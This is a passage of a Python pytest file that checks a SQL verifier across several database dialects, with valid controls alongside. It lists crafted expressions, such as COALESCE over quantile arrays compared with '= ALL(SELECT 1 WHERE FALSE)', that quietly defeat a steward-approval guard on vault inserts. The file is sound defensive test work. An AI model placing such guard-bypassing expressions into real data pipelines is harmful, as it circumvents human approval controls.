        "COALESCE(CAST(QUANTILE(1, [0.5]) OVER () AS BOOLEAN[])[1], 'true')",
        "COALESCE(LIST_EXTRACT(CAST(QUANTILE(1, [0.5]) OVER () AS BOOLEAN[]), 1), 'true')",
        "COALESCE(LIST_FIRST(CAST(QUANTILE(1, [0.5]) OVER () AS BOOLEAN[])), 'true')",
        "COALESCE(LIST_MAX(CAST(QUANTILE(1, [0.5]) OVER () AS BOOLEAN[])), 'true')",
        "COALESCE(CAST(ARRAY_SLICE(QUANTILE(1, [0.5]) OVER (), 1, 1) AS BOOLEAN[])[1], 'true')",
        "COALESCE(CAST((SELECT QUANTILE(1, [0.5])) AS BOOLEAN[])[1], 'true')",
    ):
        row = ddb.execute(f"SELECT {live_expr}, typeof({live_expr}) FROM staging.s").fetchone()
        assert row is not None and isinstance(row[0], bool) and row[0] is True and row[1] == "BOOLEAN", (
            live_expr, row,
        )
    ddb.close()

    blocked: list[tuple[str, str]] = [
        # Item 1: value-passthrough wrappers & derived subquery columns over quantile-array producers
        ("duckdb_local", "COALESCE((SELECT LIST_EXTRACT(ANY_VALUE(q) OVER (), 1) FROM (SELECT QUANTILE(1 = 1, [0.5]) AS q) t), 'true')"),
        ("duckdb_local", "COALESCE(LIST_EXTRACT(FIRST_VALUE(QUANTILE(1 = 1, [0.5])) OVER (), 1), 'true')"),
        ("duckdb_local", "COALESCE(LIST_EXTRACT(LAST_VALUE(QUANTILE(1 = 1, [0.5])) OVER (), 1), 'true')"),
        ("duckdb_local", "COALESCE(LIST_EXTRACT(MIN(QUANTILE(1 = 1, [0.5])) OVER (), 1), 'true')"),
        ("duckdb_local", "COALESCE(LIST_EXTRACT(MAX(QUANTILE(1 = 1, [0.5])) OVER (), 1), 'true')"),
        ("duckdb_local", "COALESCE(LIST_EXTRACT(ANY_VALUE(QUANTILE(1 = 1, [0.5])) OVER (), 1), 'true')"),
        ("duckdb_local", "COALESCE(LIST_EXTRACT(NTH_VALUE(QUANTILE(1 = 1, [0.5]), 1) OVER (), 1), 'true')"),
        ("duckdb_local", "COALESCE(LIST_EXTRACT(NTH_VALUE(QUANTILE(1 = 1, [0.5]), 2) OVER (), 1), 'true')"),
        ("duckdb_local", "COALESCE(LIST_EXTRACT(LAG(QUANTILE(1 = 1, [0.5]), 0) OVER (), 1), 'true')"),
        ("duckdb_local", "COALESCE(LIST_EXTRACT(LAG(QUANTILE(1 = 1, [0.5]), 1, [FALSE]) OVER (), 1), 'true')"),
        ("duckdb_local", "COALESCE(LIST_EXTRACT(MODE() WITHIN GROUP (ORDER BY QUANTILE(1 = 1, [0.5])), 1), 'true')"),
        ("duckdb_local", "COALESCE((FIRST_VALUE(QUANTILE(1 = 1, [0.5])) OVER () || [FALSE])[1], 'true')"),
        ("duckdb_local", "COALESCE((MODE() WITHIN GROUP (ORDER BY QUANTILE(1 = 1, [0.5])) || [FALSE])[1], 'true')"),
        ("clickhouse", "COALESCE(arrayElement(anyIf(quantilesExact(0.5)(1 = 1), 1) OVER (), 1), 'true')"),
        ("clickhouse", "COALESCE(arrayElement(anyLastIf(quantilesExact(0.5)(1 = 1), 1) OVER (), 1), 'true')"),
        ("clickhouse", "COALESCE(arrayElement(minIf(quantilesExact(0.5)(1 = 1), 1) OVER (), 1), 'true')"),
        ("clickhouse", "COALESCE(arrayElement(maxIf(quantilesExact(0.5)(1 = 1), 1) OVER (), 1), 'true')"),
        ("clickhouse", "COALESCE(arrayElement(lagInFrame(quantilesExact(0.5)(1 = 1), 0) OVER (), 1), 'true')"),
        # Item 2: ARRAY_REVERSE / LIST_REVERSE / arrayReverse, mutators, & ClickHouse arrayElement(..., 0)
        ("duckdb_local", "COALESCE(LIST_REVERSE([NULL, 1 = 1])[1], 'true')"),
        ("duckdb_local", "COALESCE(ARRAY_REVERSE([NULL, 1 = 1])[1], 'true')"),
        ("duckdb_local", "COALESCE(LIST_SORT([NULL, 1 = 1])[1], 'true')"),
        ("duckdb_local", "COALESCE(LIST_REVERSE_SORT([NULL, 1 = 1])[1], 'true')"),
        ("duckdb_local", "COALESCE(LIST_DISTINCT([NULL, 1 = 1])[1], 'true')"),
        ("duckdb_local", "COALESCE(ARRAY_COMPACT([NULL, 1 = 1])[1], 'true')"),
        ("clickhouse", "COALESCE(arrayElement(arrayReverse([1, 1 = 1]), 1), 'true')"),
        ("clickhouse", "COALESCE(arrayElement(arrayPopFront([1, 1 = 1]), 1), 'true')"),
        ("clickhouse", "COALESCE(arrayElement([1 = 1], 0), 'true')"),
        ("snowflake", "COALESCE(GET(ARRAY_REVERSE(ARRAY_CONSTRUCT(1, 1 = 1)), 0), 'true')"),
        ("databricks_uc", "COALESCE(ELEMENT_AT(ARRAY_REVERSE(ARRAY(1, 1 = 1)), 1), 'true')"),
        # Item 3: CAST(<non-ctor array> AS BOOLEAN[] / ARRAY<BOOL> / Array(Bool) / BIT[])
        ("duckdb_local", "COALESCE(CAST(QUANTILE(1, [0.5]) OVER () AS BOOLEAN[])[1], 'true')"),
        ("duckdb_local", "COALESCE(CAST(QUANTILE(1, [0.5]) OVER () AS BIT[])[1], 'true')"),
        ("duckdb_local", "COALESCE(CAST(QUANTILE(1, [0.5, 0.9]) OVER () AS BOOLEAN[])[2], 'true')"),
        ("duckdb_local", "COALESCE(LIST_EXTRACT(CAST(QUANTILE(1, [0.5]) OVER () AS BOOLEAN[]), 1), 'true')"),
        ("duckdb_local", "COALESCE(LIST_FIRST(CAST(QUANTILE(1, [0.5]) OVER () AS BOOLEAN[])), 'true')"),
        ("duckdb_local", "COALESCE(LIST_MAX(CAST(QUANTILE(1, [0.5]) OVER () AS BOOLEAN[])), 'true')"),
        ("duckdb_local", "COALESCE(CAST(ARRAY_SLICE(QUANTILE(1, [0.5]) OVER (), 1, 1) AS BOOLEAN[])[1], 'true')"),
        ("duckdb_local", "COALESCE(CAST((SELECT QUANTILE(1, [0.5])) AS BOOLEAN[])[1], 'true')"),
        ("duckdb_local", "COALESCE(LIST_TRANSFORM(CAST(QUANTILE(1, [0.5]) OVER () AS BOOLEAN[]), lambda x: x)[1], 'true')"),
        ("postgres", "COALESCE((CAST(PERCENTILE_DISC(ARRAY[0.5]) WITHIN GROUP (ORDER BY 1) OVER () AS BOOLEAN[]))[1], 'true')"),
        ("clickhouse", "COALESCE(arrayElement(CAST(quantilesExact(0.5, 0.9)(1) OVER () AS Array(Bool)), 1), 'true')"),
        ("clickhouse", "COALESCE(arrayElement(CAST(quantilesExact(0.5, 0.9)(1) OVER () AS Array(LowCardinality(Bool))), 1), 'true')"),
        ("bigquery", "COALESCE(ARRAY_FIRST(CAST(QUANTILE(1, [0.5]) OVER () AS ARRAY<BOOL>)), 'true')"),
    ]

    for tid, expr in blocked:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {expr} = ALL(SELECT 1 WHERE FALSE)"
        )
        assert is_bool_or_null_expr(sqlglot.parse_one(expr, read=dialect)) is True, (tid, expr)
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            tid, expr,
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), (tid, expr)
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    cte_blocked_sql = (
        "INSERT INTO raw_vault.lnk_u (hk_u) "
        "WITH c AS (SELECT s.hk, s.steward_gate_status, "
        "COALESCE(LIST_EXTRACT(FIRST_VALUE(QUANTILE(1 = 1, [0.5])) OVER (), 1), 'true') AS flag "
        "FROM staging.s AS s GROUP BY s.hk, s.steward_gate_status) "
        "SELECT c.hk FROM c WHERE c.steward_gate_status = 'APPROVED' "
        "AND c.flag = ALL(SELECT 1 WHERE FALSE)"
    )
    assert has_steward_approved_guard(sqlglot.parse_one(cte_blocked_sql, read="duckdb")) is False
    assert any(
        d.rule_id == "DV-AST-007" and d.severity == "BLOCKER"
        for d in verifier.verify_sql(cte_blocked_sql, "duckdb_local", extra_unstructured_links=["lnk_u"])
    )

    for cte_ok_expr in (
        "COALESCE(LIST_EXTRACT(FIRST_VALUE(QUANTILE(1, [0.5])) OVER (), 1), 1)",
        "COALESCE(LIST_EXTRACT(MODE() WITHIN GROUP (ORDER BY QUANTILE(1, [0.5])), 1), 1)",
    ):
        assert is_bool_or_null_expr(sqlglot.parse_one(cte_ok_expr, read="duckdb")) is False, cte_ok_expr
        cte_ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) "
            f"WITH c AS (SELECT s.hk, s.steward_gate_status, {cte_ok_expr} AS flag "
            "FROM staging.s AS s GROUP BY s.hk, s.steward_gate_status) "
            "SELECT c.hk FROM c WHERE c.steward_gate_status = 'APPROVED' AND c.flag = 1"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(cte_ok_sql, read="duckdb")) is True, cte_ok_expr
        assert verifier.verify_sql(cte_ok_sql, "duckdb_local", extra_unstructured_links=["lnk_u"]) == []
        assert gate.verify_sql_ast(
            "duckdb_local", cte_ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == []

    valid_controls: list[tuple[str, str, str]] = [
        ("duckdb_local", "COALESCE((SELECT LIST_EXTRACT(ANY_VALUE(q) OVER (), 1) FROM (SELECT QUANTILE(1, [0.5]) AS q) t), 1)", "= 1"),
        ("clickhouse", "COALESCE(arrayElement(arrayReverse([1 = 1, 1]), 1), 1)", "= 1"),
        ("clickhouse", "COALESCE(arrayElement(arrayPopFront([1 = 1, 1]), 1), 1)", "= 1"),
        ("clickhouse", "COALESCE(arrayElement(arrayPopBack([1, 1 = 1]), 1), 1)", "= 1"),
        ("clickhouse", "COALESCE(arrayElement([1, 2], 0), 1)", "= 1"),
        ("duckdb_local", "COALESCE(LIST_REVERSE([1 = 1, 1])[1], 1)", "= 1"),
        ("duckdb_local", "COALESCE(LIST_EXTRACT([1 = 1], 0), 1)", "= 1"),
        ("duckdb_local", "COALESCE(CAST(QUANTILE(1, [0.5]) OVER () AS INT[])[1], 1)", "= 1"),
        ("duckdb_local", "COALESCE(CAST(QUANTILE(1, [0.5]) OVER () AS VARCHAR[])[1], 'a')", "= 'a'"),
        ("duckdb_local", "COALESCE(CAST(QUANTILE(1 = 1, [0.5]) OVER () AS INT[])[1], 1)", "= 1"),
        ("duckdb_local", "COALESCE(CAST([] AS BOOLEAN[])[1], 1)", "= 1"),
        ("duckdb_local", "COALESCE(CAST(s.arr AS BOOLEAN[]), ARRAY[FALSE])", "= ARRAY[FALSE]"),
    ]
    for ok_tid, ok_expr, rhs in valid_controls:
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        assert is_bool_or_null_expr(sqlglot.parse_one(ok_expr, read=dialect)) is False, (
            ok_tid, ok_expr,
        )
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_expr} {rhs}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_expr,
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_expr,
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_expr)


